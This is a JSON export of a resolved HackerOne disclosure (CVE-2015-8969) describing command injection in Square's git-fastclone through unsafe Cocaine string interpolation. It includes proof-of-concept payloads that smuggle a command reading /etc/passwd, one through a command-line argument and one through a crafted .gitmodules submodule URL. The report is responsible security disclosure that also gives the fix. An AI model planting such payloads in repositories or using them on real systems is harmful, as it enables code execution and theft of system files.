{
  "id": 105190,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDUxOTA=",
  "url": "https://hackerone.com/reports/105190",
  "title": "Unsafe usage of Ruby string interpolation enabling command injection in git-fastclone",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2015-12-15T04:47:56.478Z",
  "submitted_at": "2015-12-15T04:47:56.478Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bburky",
    "url": "/bburky",
    "profile_picture_urls": {
      "small": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MzIyMiwicHVyIjoiYmxvYl9pZCJ9fQ==--9482ae94c0ea5a39bc371554f3a38d04fd3342f5/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJncmF2aXR5IjoiQ2VudGVyIiwicmVzaXplIjoiNjJ4NjJeIiwiY3JvcCI6IjYyeDYyKzArMCJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--a4d91faed3dff6024dfc1a7b7f8ccc6b45e38396/bomb.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1644,
    "url": "https://hackerone.com/square-open-source",
    "handle": "square-open-source",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/644/902e831617282e2da7c1cb7aeecf24117b9004a5_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/644/902e831617282e2da7c1cb7aeecf24117b9004a5_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Square Open Source",
      "twitter_handle": "SquareEng",
      "website": "https://github.com/square",
      "about": ""
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2015-8969"
  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-01-25T18:40:58.775Z",
  "bug_reporter_agreed_on_going_public_at": "2016-01-19T23:21:00.484Z",
  "team_member_agreed_on_going_public_at": "2016-01-25T18:40:57.974Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "While testing git-fastclone for the ext protocol issues in my other report, I looked at the source code and immediately noticed you're using the [Cocaine][0] library unsafely. Cocaine will protect from command injection but it \"only does that for arguments interpolated via run, NOT arguments passed into new\" (from it's README).\n\nThroughout git-fastclone you call `Cocaine::CommandLine.new` and use plain Ruby string interpolation. This is enables command injection in basically every instance. Instead you need to construct the command line passed to `#new` with `:foo` placeholders and use `#run` to perform the variable substitution. The [security section of the README][1] talks about this a bit.\n\nHere's a very simple exploit POC:\n\n    git fastclone \"'\"'$(cat /etc/passwd >&2)'\"'\"\n\nThis first POC may seem less severe because the exploit string is visible to the user. However, in many places command injection is possible using from attacker controlled values within the git repository. Consider the following POC instead which performs command injection into `Cocaine::CommandLine` through a git submodule URL. (Note that this exploit has absolutely nothing at all to do with my previous report concerning the git ext protocol.)\n\n    git init cocaine-command-injection\n    cd cocaine-command-injection\n    \n    # This can be the URL of any valid git repository\n    # This is just used to initially create the submodule in the repo\n    git submodule add https://github.com/octocat/Hello-World malicious-submodule\n    \n    cat >.gitmodules <<\"EOF\"\n    [submodule \"malicious-submodule\"]\n        path = malicious-submodule\n        url = \"'`cat /etc/passwd >&2`'\"\n    EOF\n    git add .gitmodules\n    git commit -m 'Malicious Cocaine command injection submodule'\n    cd ..\n    \n    # Now clone the repository\n    git fastclone cocaine-command-injection cocaine-command-injection-clone\n\nPlease instead safely build Cocaine::CommandLine calls by passing placeholders to `#new` and use Cocaine's variable interpolation using the hash passed to `#run`.\n\n[0]: https://github.com/thoughtbot/cocaine\n[1]: https://github.com/thoughtbot/cocaine/blob/master/README.md#security",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-02-18T23:21:01.082Z",
  "allow_singular_disclosure_after": -302705969.38342,
  "singular_disclosure_allowed": true,
  "vote_count": 2,
  "voters": [
    "michiel",
    "mak"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
